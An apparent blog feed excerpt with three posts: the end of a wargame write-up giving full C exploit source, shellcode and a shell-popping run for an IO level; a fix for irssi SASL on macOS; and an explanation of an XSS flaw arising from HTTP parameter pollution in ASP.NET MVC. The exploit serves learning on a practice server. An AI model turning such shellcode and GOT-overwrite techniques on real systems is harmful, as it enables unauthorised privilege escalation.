<p>Wrong, there is still one more issue. If this code runs successfully, then <code>EIP</code> should point directly at <code>argv[0]</code>; that is, it&#8217;ll point at the string which contains the name of the program that was executed, <code>/levels/level07_alt</code>. This isn&#8217;t exactly usable shellcode that is going to give us what we need. However, there is a way around this. In C, we can use the <code>execl()</code> function to invoke another binary, and specify <em>all</em> of the arguments <em>including</em> <code>argv[0]</code>. As a result, we can write some shellcode and use this for <code>argv[0]</code> instead of the program name.</p>

<p>So with all this in mind, below is the full source to the exploit (rather verbose, but it&#8217;s on purpose) in C:</p>

<figure class='code'><figcaption><span>Exploit Source  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">target</span> <span class="o">=</span> <span class="s">&quot;/levels/level07_alt&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x46\x31\xdb\x31\xc9</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xeb\x16\x5b\x31\xc0\x88</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x43\x07\x89\x5b\x08\x89\x43\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xe8\xe5\xff\xff\xff\x2f</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x62\x69\x6e\x2f\x73\x68\x58\x41</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x41\x41\x41\x42\x42\x42\x42\x90</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// this is the address of the count array in memory</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">countAddress</span> <span class="o">=</span> <span class="mh">0x08049720</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// address of the printf GOT entry</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfAddress</span> <span class="o">=</span> <span class="mh">0x80496e8</span><span class="p">;</span>
</span><span class='line'><span class="c1">// initial value of the printf GOT entry</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfValue</span> <span class="o">=</span> <span class="mh">0x080482de</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// The index into the count array which stores the first</span>
</span><span class='line'><span class="c1">// instruction which will be executed when the program</span>
</span><span class='line'><span class="c1">// attempts to print out the results.</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">instructionStartIndex</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// there are all the opcodes we need to write to</span>
</span><span class='line'><span class="c1">// the count array (in little-endian order)</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEaxEcx</span> <span class="o">=</span> <span class="mh">0xC889</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">incIncEcx</span> <span class="o">=</span> <span class="mh">0x4141</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEcxEcx</span> <span class="o">=</span> <span class="mh">0x98B</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">jmpEcx</span> <span class="o">=</span> <span class="mh">0x21FF</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Helper function which gives us the index into the count</span>
</span><span class='line'><span class="c1">// array that we would need in order to write a value to the</span>
</span><span class='line'><span class="c1">// given targetAddress.</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">getIndex</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">targetAddress</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">&lt;</span> <span class="n">countAddress</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="p">(</span><span class="n">countAddress</span> <span class="o">-</span> <span class="n">targetAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">-</span> <span class="n">countAddress</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Helper function which takes a buffer, a value, and a counter and will</span>
</span><span class='line'><span class="c1">// repeatedly write the value to the buffer until the appropriate number of</span>
</span><span class='line'><span class="c1">// writes has happened. It&#39;ll return a pointer to the memory location</span>
</span><span class='line'><span class="c1">// which immediately follows where it finished off.</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">repeat</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">destination</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">value</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="n">destination</span><span class="o">++</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">destination</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">// calculate some offets and indexes</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">startInstructionAddress</span> <span class="o">=</span> <span class="n">instructionStartIndex</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">countAddress</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfIndex</span> <span class="o">=</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">printfAddress</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfInc</span> <span class="o">=</span> <span class="n">startInstructionAddress</span> <span class="o">-</span> <span class="n">printfValue</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">argBufSize</span> <span class="o">=</span> <span class="n">printfInc</span> <span class="o">+</span> <span class="n">movEaxEcx</span> <span class="o">+</span> <span class="n">incIncEcx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">movEcxEcx</span> <span class="o">+</span> <span class="n">jmpEcx</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cursor</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// allocate some memory for our command line arguments and null terminate it</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argBuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">argBufSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">argBuf</span><span class="p">[</span><span class="n">argBufSize</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// start by writing data required to point the printf entry to our location</span>
</span><span class='line'>  <span class="c1">// in the count array that contains our instructions</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">argBuf</span><span class="p">,</span> <span class="n">printfIndex</span><span class="p">,</span> <span class="n">printfInc</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// then write all our opcodes</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span><span class="p">,</span> <span class="n">movEaxEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="n">movEcxEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">jmpEcx</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Attempting to exploit, good luck!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// finally invoke the program, passing in the shell code and</span>
</span><span class='line'>  <span class="c1">// making sure that EAX contains 8 at the right time.</span>
</span><span class='line'>  <span class="n">execl</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x08</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argBuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">argBuf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Upload, compile and run the exploit and this is what happens:</p>

<figure class='code'><figcaption><span>Exploit Run  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/.oj<span class="nv">$ </span>./sploit
</span><span class='line'>Attempting to exploit, good luck!
</span><span class='line'>sh-4.2<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span>,1007<span class="o">(</span>level7<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span>cat /home/level8/.pass
</span><span class='line'>&lt;&lt; -- password was printed here -- &gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Game over! What a great challenge that was.</p>

<p>I&#8217;d like to point out that this alternate level took me a <em>very long time</em> to nail. It was well worth the effort, and I learned a stack in the process.</p>

<p>Feedback is appreciated as always. Thanks for reading.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Irssi and SASL on OSX]]></title>
    <link href="http://buffered.io/posts/irssi-and-sasl-on-osx/"/>
    <updated>2013-02-03T08:37:00+10:00</updated>
    <id>http://buffered.io/posts/irssi-and-sasl-on-osx</id>
    <content type="html"><![CDATA[<p>Given my renewed focus on security I&#8217;ve been looking to lock down much of my communications so that I <em>feel</em> more secure online. One of the things that I use quite a lot to connect with people who know WTF they&#8217;re talking about is IRC. <a href="https://freenode.net/" title="Freenode IRC network">#freenode</a> is my network of choice as it has a bunch of interesting places with fairly active communities. <a href="http://www.irssi.org/" title="irssi IRC client">irssi</a> is my current client of choice for a few reasons.</p>

<p><a href="https://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer" title="SASL">SASL</a>, among other things, is one thing that can be enabled to secure your communication on IRC. There&#8217;s quite a bit of information out there already about how to <a href="https://freenode.net/sasl/sasl-irssi.shtml" title="Enabling SASL in irssi on Freenode">enable SASL for irssi on Freenode</a>. These instructions worked out of the box for me on Linux, but not on Mac OSX. After downloading <code>cap_sasl.pl</code> and putting it in <code>~/.irssi/scripts/autorun</code> and installing the required Perl modules I went through the steps to get SASL configured. When I attempted to enable it as per the instructions using the command <code>/sasl set network TheColonial &lt;password&gt; DH-BLOWFISH</code> I had the following error:</p>

<blockquote><p>Can&#8217;t locate object method &#8220;send_raw_now&#8221; via package &#8220;Irssi::Irc::Server&#8221;</p></blockquote>

<p>This took a bit of Googling to nail. It turns out that, for some reason, on Mac OSX <code>irssi</code> actually requires an extra package to be included in the script. So open <code>cap_sasl.pl</code> and look for this (it&#8217;s right at the top):</p>

<pre><code>use strict;
use Irssi;
</code></pre>

<p>Immediately below this, add the following:</p>

<pre><code>use Irssi::Irc;
</code></pre>

<p>The script should now run fine and <code>irssi</code> should stop complaining.</p>

<p>This might seem obvious to some, but it wasn&#8217;t to me! From what I can tell other people around the traps have had the same problem so I thought I&#8217;d post this in the hope that it helps others.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies]]></title>
    <link href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/"/>
    <updated>2012-11-29T20:50:00+10:00</updated>
    <id>http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies</id>
    <content type="html"><![CDATA[<p>Forgive the title of the post, it was hard coming up with something succinct that captured the purpose of the post. This was inspired by a recent experience with a client who had this exact problem with one of their production systems.</p>

<h2>TL;DR</h2>

<p>Never use <a href="http://msdn.microsoft.com/en-us/library/ms524784(v=vs.90).aspx">Request.QueryString</a> to access parameters in your views, even when you&#8217;re sure your actions have validated them. You may open your application up to <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> attacks. Always, <em>always</em> use data that is passed to your views via the <code>Model</code> or the <a href="http://msdn.microsoft.com/en-us/library/system.web.mvc.viewpage.viewdata(v=vs.108).aspx">ViewData</a> dictionary. Under no circumstances should you trust data coming in from the web, that includes query string parameters.</p>

<!--more-->


<h2>Setting the scene</h2>

<p>The application provided a certain function which allowed users to browse information tied to a number of entities. For the sake of this discussion let&#8217;s say those entities were instances of a <strong>Person</strong>. The number of entities was extremely small, so it was decided that the interface would consist of a drop-down box consisting of all the entities. When that drop-down box was used a <em>change</em> event would fire using JavaScript that would modify the current URL and render a new page. That page would show the same drop-down list, with the appropriate entry selected, along with the information specfic to that entity.</p>

<p>Let&#8217;s see some code starting with the &#8220;details&#8221; of the person:</p>

<figure class='code'><figcaption><span>Person.cs  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='csharp'><span class='line'><span class="k">public</span> <span class="k">class</span> <span class="nc">Person</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">public</span> <span class="kt">string</span> <span class="n">Name</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span><span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>    <span class="k">public</span> <span class="kt">int</span> <span class="n">Age</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nothing too amazing there. Here&#8217;s the parts of the page which renders the list of people:</p>

<figure class='code'><figcaption><span>Index.aspx (partial)  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Please choose a person <span class="err">&lt;</span>%= Html.DropDownList(&quot;people&quot;, Model) %&gt;
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#people&quot;</span><span class="p">).</span><span class="nx">change</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;&lt;%= Url.Action(&quot;Detail&quot;, &quot;Person&quot;) %&gt;?index=&#39;</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span><span class='line'>  <span class="p">});</span>
</span><span class='line'><span class="p">});</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Again, nothing too mind boggling here either. We can see how the <code>change</code> event fires and updates the <code>window.location</code> and moves the user to the <code>Details</code> page. The <code>Model</code> for this page is of type <code>IEnumerable&lt;SelectListItem&gt;</code>.</p>

<p>Next we&#8217;ll take a look at the controller action which gets invoked when the drop-down is changed:</p>

<figure class='code'><figcaption><span>PersonController.cs (Partial)  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='csharp'><span class='line'><span class="k">public</span> <span class="n">ActionResult</span> <span class="nf">Detail</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nf">View</span><span class="p">(</span><span class="s">&quot;Detail&quot;</span><span class="p">,</span> <span class="n">Tuple</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">People</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">GetPeople</span><span class="p">()));</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&#8217;re using the <code>index</code> parameter (note the <em>type</em> of this parameter, it&#8217;s important) to index into the list of people we have stashed somewhere to extract the user that is being viewed. This person, along with the full list of people in <code>SelectListItem</code> form, is being passed to the view.</p>

<p>Let&#8217;s see what the view does with this information:</p>

<figure class='code'><figcaption><span>Detail.aspx (partial)  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Please choose a person <span class="err">&lt;</span>%= Html.DropDownList(&quot;people&quot;, Model.Item2) %&gt;
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#people&quot;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="o">&lt;%=</span> <span class="nx">Request</span><span class="p">.</span><span class="nx">QueryString</span><span class="p">[</span><span class="s2">&quot;index&quot;</span><span class="p">]</span> <span class="o">%&gt;</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#people&quot;</span><span class="p">).</span><span class="nx">change</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;&lt;%= Url.Action(&quot;Detail&quot;, &quot;Person&quot;) %&gt;?index=&#39;</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span><span class='line'>  <span class="p">});</span>
</span><span class='line'><span class="p">});</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span><span class='line'><span class="err">&lt;</span>%= Html.Encode(Model.Item1.Name) %&gt; is a whopping <span class="err">&lt;</span>%= Model.Item1.Age %&gt; years old!
</span><span class='line'><span class="nt">&lt;/p&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is starting to get a bit more interesting. The rendering of the drop-down is the same as before, except it&#8217;s pulling data from the <a href="http://msdn.microsoft.com/en-us/library/system.tuple.aspx">System.Tuple</a> that was passed in as the <code>Model</code>. The event handler that&#8217;s invoked on <code>change</code> is the same, and there&#8217;s a bit of non-descript content rendering a the bottom. The subtle but important difference is the code that sets the currently selected person in the drop-down.</p>

<p>I plugged this code into a standard MVC application and this is what it looks like:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-index.png" title="'Choosing a person'" ></p>

<p>After selecting a person from the drop down it looks like this:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-details.png" title="'Person details'" ></p>

<h2>A bad assumption</h2>

<p>As you already know, ASP.NET MVC has the ability to automatically convert query string parameters into type-safe arguments that are passed into the controller actions. In the above example the <code>index</code> query string parameter is converted to an <code>int</code> and passed into the <code>Details</code> action. If a user attempts to modify this value to something that isn&#8217;t an integer then MVC will literally poop itself, right?</p>

<p>Let&#8217;s see.</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-type-fail.png" title="'Person details'" ></p>

<p>OK, so MVC will require that this value be an integer, otherwise the action will fail to be invoked. If that&#8217;s the case, then the view won&#8217;t be rendered and our code which directly accesses <code>Request.QueryString</code> will not be invoked and hence there&#8217;s no risk.</p>

<p>Right?</p>

<p><a href="http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/">Wrong</a>.</p>

<h2>The attack vector</h2>

<p><a href="http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/">HTTP Parameter Pollution</a> is a relatively &#8220;new&#8221; problem which revolves around the way that web servers/applications parse and handle multiple instances of the same GET/POST parameter. Phew!</p>

<p>In other words, if a malicious user decides to pass in <em>another</em> instance of the <code>index</code> parameter in the query string, what happens? The way this is handled varies from technology to technology (see <a href="https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf">slide 9</a> for some examples), but here we&#8217;re only interested in ASP.NET with IIS and MVC.</p>

<p>Let me just state this again: we&#8217;re only interested in ASP.NET and IIS <em><strong>and MVC</strong></em>. The reason we need to emphasise this is because MVC rocks the boat a little bit. It&#8217;s important to remember that <a href="http://msdn.microsoft.com/en-us/library/ms524784(v=vs.90).aspx">Request.QueryString</a> is not specific to MVC, it&#8217;s something that lives in ASP.NET land. <em>Controller actions</em> on the other hand are not available across the board when using ASP.NET, they live in MVC land. When it comes to binding query string parameters to controller action method parameters, MVC doesn&#8217;t behave how you would expect, and it&#8217;s not the same as what happens when dealing with <code>Request.QueryString</code> directly.</p>

<p>So what happens in ASP.NET and IIS <em>without</em> MVC if an attacker passes in two values for the same parameter? Consider the following url: <code>http://foo.com/bar?baz=0&amp;baz=dooby</code></p>

<p>While in C# land (remember, outside of MVC) <code>Request.QueryString["baz"]</code> will contain a string value <code>0,dooby</code>. In our current environment any duplicate instances of query string values are passed through as a single value joined together by commas. This knowledge is scarily uncommon. Many .NET developers that I know are not aware of this behaviour.</p>

<p>This is where MVC comes along and sprays poop over everything.</p>

